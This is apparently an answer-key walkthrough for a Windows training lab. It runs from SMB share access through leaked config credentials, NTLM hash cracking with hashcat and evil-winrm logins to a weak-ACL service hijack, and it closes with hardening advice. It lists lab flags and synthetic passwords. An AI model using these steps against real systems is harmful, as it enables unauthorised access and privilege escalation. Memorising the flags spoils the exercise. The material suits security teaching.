# WinE v1 — Walkthrough

> **At a glance**
>
> **Goal:** Explain the evidence trail from SMB access to Windows identity and privilege checks.
> **Workbook:** [WinE v1 - Workbook](v1-workbook.md) · **Project:** [WinE](README.md) · **Domain:** [G5Labs](../README.md)

|Target|Attacker|Baseline|
|---|---|---|
|WinE `192.168.56.217`|Kali `192.168.56.204`|`WinE_v1_Ready`|

> **Verification Status**
>
> SMB and RPC responded during the 2026-10-07 host check. The supplied SMB account authenticated and both Flag 1/2 files were retrieved and matched the answer key. WinRM timed out from the host. The later service/account route needs validation through Kali; this answer key describes intended results, not a verified complete chain.

## Lab Architecture & User Tiers

|User|Role|Intended Route|Objectives|
|---|---|---|---|
|`svc_backup`|Backup Service Account|SMB Share Enumeration (`PublicBackup`)|Flags 1 & 2|
|`svc_backup`|WinRM Shell Context|Profile Inspection & NTLM Dump Recovery|Flag 3|
|`analyst`|Junior Operator|NTLM Hash Recovery & WinRM Shell|Flag 4|
|`secops`|Security Operations|Service Folder DACL Hijacking (`run.bat`)|Flags 5 & 6|
|`Administrator` / `SYSTEM`|Identity to prove|Privileged execution and token evidence|Flag 7|

## Flag Walkthrough

#### Flag 1 — Windows Service Reconnaissance & File Shares

- **Capability Stage:** _I recognise_ (Windows SMB service presence and share identification)

- **Execution:** From Kali, query open SMB shares using the supplied starting service account:

    ```
    smbclient -L //192.168.56.217 -U svc_backup
    ```

    Enter the synthetic starting password `BackupPass2024!` when prompted. This is authenticated access, despite the Flag 1 string containing “anonymous”. Connect to the share:

    ```
    smbclient //192.168.56.217/PublicBackup -U svc_backup
    ```

    Inside the SMB shell, list and retrieve the notification notice:

    ```
    ls
    get notice.txt
    exit
    ```

    Inspect on Kali:

    ```
    cat notice.txt
    ```

- **Discovery:** Identifies public maintenance notes and Flag 1.

- **Recovery:** `FLAG{w1n_smb_4n0nym0us_sh4r3_d1sc0v3r3d}`

#### Flag 2 — Secret Storage & Configuration File Exposure

- **Capability Stage:** _I know_ (Developers and administrators leave credentials in backup configurations)

- **Execution:** Download the database sync configuration file from the share:

    ```
    smbclient //192.168.56.217/PublicBackup -U svc_backup -c 'get backup_config.ini; exit'
    cat backup_config.ini
    ```

- **Discovery:** Recovers database sync configuration details, service account credentials, and Flag 2.

- **Recovery:**

    - **Flag:** `FLAG{w1n_cl34rt3xt_c0nf1g_cr3ds_l34k}`

    - **Credentials:** `svc_backup:BackupPass2024!`

#### Flag 3 — Hash Identification & Offline Recovery

- **Capability Stage:** _I know_ (Identifying Windows NTLM hashes and cracking them offline)

- **Execution:**

    1. Establish an interactive PowerShell session as `svc_backup` via WinRM:

        ```
        evil-winrm -i 192.168.56.217 -u 'svc_backup' -p 'BackupPass2024!'
        ```

    2. Inspect the documents folder for system audit dumps:

        ```
        type C:\Users\svc_backup\Documents\audit_notes.txt
        ```

    3. Extract the hash entry for user `analyst`:

        ```
        analyst:1002:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
        ```

    4. On Kali, save the NTLM hash (`8846f7eaee8fb117ad06bdd830b7586c`) to `analyst_hash.txt` and crack it using Hashcat:

        ```
        echo "8846f7eaee8fb117ad06bdd830b7586c" > analyst_hash.txt
        hashcat -m 1000 analyst_hash.txt /usr/share/wordlists/rockyou.txt
        ```

- **Recovery:**

    - **Flag:** `FLAG{w1n_ntlm_h4sh_hunt3r_c0mpl3t3}`

    - **Cracked Password for the recorded hash:** `password`

> **Hash and Login Must Match**
>
> The recorded NT hash `8846f7eaee8fb117ad06bdd830b7586c` is for `password`. `Dragon123!` hashes to `4239c5adc205507607638766373796ac`. Local MD4-of-UTF-16LE checks confirmed this. Use the cracking result, then test login; if the lab account still uses the other password, the staged hash and account need aligning before this is a working chain.

#### Flag 4 — Remote Management Foothold & Operator Identity

- **Capability Stage:** _I can choose_ (Authenticating into Windows Remote Management)

- **Execution:**

    1. Authenticate as the operator `analyst` using Evil-WinRM:

        ```
        evil-winrm -i 192.168.56.217 -u 'analyst' -p 'password'
        ```

    2. Verify identity and privileges:

        ```
        whoami
        whoami /groups
        ```

    3. Retrieve the desktop flag:

        ```
        type C:\Users\analyst\Desktop\FLAG4.txt
        ```

- **Recovery:**

    - **Flag:** `FLAG{w1n_w1nrm_f00th0ld_succ3ss}`

    - **Hint:** Look for non-standard services running with permissive file ACLs.

#### Flag 5 — Access Control List (ACL) Enumeration

- **Capability Stage:** _I can interpret_ (Interpreting Windows permissions with `icacls`)

- **Execution:**

    1. From the `analyst` WinRM shell, query installed services:

        ```
        Get-CimInstance win32_service | Where-Object {$_.Name -eq "MaintenanceService"} | Select-Object Name, PathName, StartName
        ```

    2. Inspect directory permissions on the application folder:

        ```
        icacls "C:\Program Files\CustomMaintenance App"
        ```

    3. Check the service log file:

        ```
        type "C:\Program Files\CustomMaintenance App\maintenance.log"
        ```

- **Discovery:** Notice `Users:(OI)(CI)M` granting members of `BUILTIN\Users` Modify permissions over the folder.

- **Recovery:** `FLAG{w1n_unqu0t3d_0r_w34k_4cl_3xp101t}`

#### Flag 6 — Prove the Service Boundary

**Question:** Does a more privileged service actually execute a file that `analyst` can modify?

From the Windows shell, gather evidence first:

```powershell
whoami
Get-CimInstance Win32_Service -Filter "Name='MaintenanceService'" |
  Select-Object Name, State, PathName, StartName
Get-Content 'C:\Program Files\CustomMaintenance App\run.bat'
icacls 'C:\Program Files\CustomMaintenance App\run.bat'
sc.exe sdshow MaintenanceService
```

Record the actual service executable or wrapper and whether it calls `run.bat`. A batch file by itself is not a normal Windows service executable. Check whether your account can start/restart the service or whether an existing scheduled trigger runs it.

> **The Missing Step**
>
> Running `cmd.exe /c run.bat` from an analyst shell runs as analyst. The current draft did not establish the privileged trigger, so it cannot yet demonstrate a pivot to `secops`. Validate that route before changing the script. Use an identity marker (`whoami` and `whoami /all` written by the privileged process) as proof, then restore the original script from the snapshot.

**Expected answer-key flag:** `FLAG{w1n_s3rv1c3_p1v0t_s3c0ps_4cc3ss}`. Its presence alone does not prove the service ran as `secops`.

#### Flag 7 — Prove Administrator or SYSTEM

`C:\Decoys\admin_notes.txt` contains the draft's decoy `FLAG{d3c0y_f4k3_w1nd0ws_fl4g_r4bb1th0l3}`. Validate privileges rather than trusting a filename or flag-shaped string.

The current draft supplies `secops:P@ssw0rdSecOps!` without showing where it is recovered. Treat it as an instructor-supplied check credential until a discovery route exists, not as a result of Flag 6.

```bash
evil-winrm -i 192.168.56.217 -u secops -p 'P@ssw0rdSecOps!'
```

After a successful login:

```powershell
whoami
whoami /all
Get-Content 'C:\Users\Administrator\Desktop\FLAG7.txt'
```

**Expected answer-key flag:** `FLAG{w1n_syst3m_0v3rl0rd_c0mpl3t3}`.

> **What Counts as Proof**
>
> Reading this file proves file access. Record the actual identity, enabled administrator group/privileges and a controlled privileged action. `secops`, Administrator and `NT AUTHORITY\SYSTEM` are different identities; the walkthrough needs a verified transition before claiming SYSTEM execution. See Windows Privilege Escalation.

## Defensive & Windows Hardening Remediation

1. **SMB Security & Auditing:** Restrict access to internal shares using explicit security groups instead of `Everyone`. Ensure audit logging is enabled for file system read/write attempts.

2. **File System ACL Enforcement:** Ensure standard users (`BUILTIN\Users`) never possess write or modify permissions (`(W)` / `(M)`) inside `C:\Program Files\` or root directories housing service executables.

3. **Service Isolation:** Use a dedicated service identity with only the rights needed. A domain-based version can explore managed service accounts later; do not assume gMSA support in this standalone lab.

4. **Credential Storage:** Store connection strings and API keys in secure credential vaults (such as Windows Credential Manager or DPAPI-backed stores) rather than plain `.ini` or `.txt` configuration files.

5. **WinRM Access Management:** Audit membership in the `Remote Management Users` group and enforce firewall restrictions limiting TCP 5985 access to authorized management subnets.
## Troubleshoot WinRM from Kali

```bash
nmap -sT -Pn -p 445,5985,5986 192.168.56.217
```

If SMB works but WinRM does not, check the listener and firewall scope from the Windows console; do not change them until you understand the intended lab configuration:

```powershell
Get-Service WinRM
winrm enumerate winrm/config/listener
Get-NetTCPConnection -State Listen -LocalPort 5985,5986
```

<details>
<summary>Service Permissions Reference</summary>

File modification rights, service start/stop rights and the service logon identity are separate controls. See [Microsoft service security documentation](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

</details>
